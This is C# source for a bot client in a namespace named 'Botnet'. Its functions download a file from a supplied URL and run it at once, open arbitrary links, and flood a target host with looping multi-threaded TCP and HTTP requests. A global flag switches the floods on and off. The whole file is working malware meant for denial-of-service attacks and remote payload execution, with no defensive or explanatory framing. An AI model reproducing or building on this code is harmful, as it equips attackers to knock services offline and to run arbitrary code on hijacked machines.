using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Botnet
{
    
    class Functions
    {
        public static bool p;

        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                
                    Thread thr = new Thread(() => { Process.Start(URI); });
                    thr.Start();
                
            }
        }

        public static void Download(string URI)
        {
            Console.WriteLine(URI);
         
                Thread thr = new Thread(() => 
                {
                    string file_path = web.DownloadFile(URI);
                    Console.WriteLine(file_path);
                    Process.Start(file_path);
                });
            thr.Start();
            
        }

        public static void DDOS(string url)
        {
            IPAddress ipAddress = Dns.GetHostEntry(url).AddressList[0];
            Console.WriteLine(ipAddress);
            for (int i=0; i< configs.threads; i++)
                {
                    new Thread( () =>
                    {
                        Thread.CurrentThread.IsBackground = true;

                        while(p)
                        {
                            try
                            {
                                TcpClient client = new TcpClient();
                                client.Connect(url, configs.port);
                                StreamWriter stream = new StreamWriter(client.GetStream());
                                stream.Write("GET /HTTP/1.0");// send packet
                                Console.WriteLine("packet sending");
                                stream.Flush();
                                stream.Close();
                             
                            }
                            catch
                            {
                                Console.WriteLine("Error or server is down");

                            }
                        }

                    }).Start();

                
            }

        }

        public static void run(Boolean t)
        {
            p = t;
            
        }

        public static  void Httprequest(string url)
        {
          
            for (int i = 0; i < configs.threads; i++)
            {
                new Thread(async () =>
                {
                    Console.WriteLine("Thred:" + i + "   " );
                    Thread.CurrentThread.IsBackground = true;

                    while (p)
                    {
                        try
                        {
                            HttpClient client = new HttpClient();
                            var result = await client.GetAsync(url).ConfigureAwait(false);
                            Console.WriteLine("code" + result.StatusCode);

                        }
                        catch
                        {
                            Console.WriteLine("Error or server is down");

                        }
                    }

                }).Start();

              

            }

        }

    }
}

